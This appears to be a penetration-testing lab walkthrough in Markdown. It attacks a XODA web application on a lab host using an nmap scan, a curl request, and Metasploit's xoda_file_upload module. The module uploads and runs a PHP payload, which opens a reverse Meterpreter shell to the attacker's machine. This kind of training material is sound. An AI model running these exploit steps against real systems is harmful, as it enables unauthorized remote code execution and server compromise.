# Metasploit

## Vulnerable web server (XODA)

nmap scan
```
nmap -sS -sV 192.103.226.3   
Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-30 05:01 UTC
Nmap scan report for target-1 (192.103.226.3)
Host is up (0.000025s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
MAC Address: 02:42:C0:67:E2:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

Do a curl to find web app name - XODA
```
curl 192.103.226.3
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
```

Metasploit
```
msf5 > use exploit/unix/webapp/xoda_file_upload
msf5 exploit(unix/webapp/xoda_file_upload) > set RHOSTS 192.103.226.3
RHOSTS => 192.103.226.3
msf5 exploit(unix/webapp/xoda_file_upload) > set LHOSTS 192.103.226.2
LHOSTS => 192.103.226.2
msf5 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /
msf5 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.103.226.2:4444 
[*] Sending PHP payload (VyFtUyjj.php)
[*] Executing PHP payload (VyFtUyjj.php)
[*] Sending stage (38247 bytes) to 192.103.226.3
[*] Meterpreter session 1 opened (192.103.226.2:4444 -> 192.103.226.3:51376) at 2021-03-30 05:04:47 +0000
[!] Deleting VyFtUyjj.php

meterpreter > 
```
